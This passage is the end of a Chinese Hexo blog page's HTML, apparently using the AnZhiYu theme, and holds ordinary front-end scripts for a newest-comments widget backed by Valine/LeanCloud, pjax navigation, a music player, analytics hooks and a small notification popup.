    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>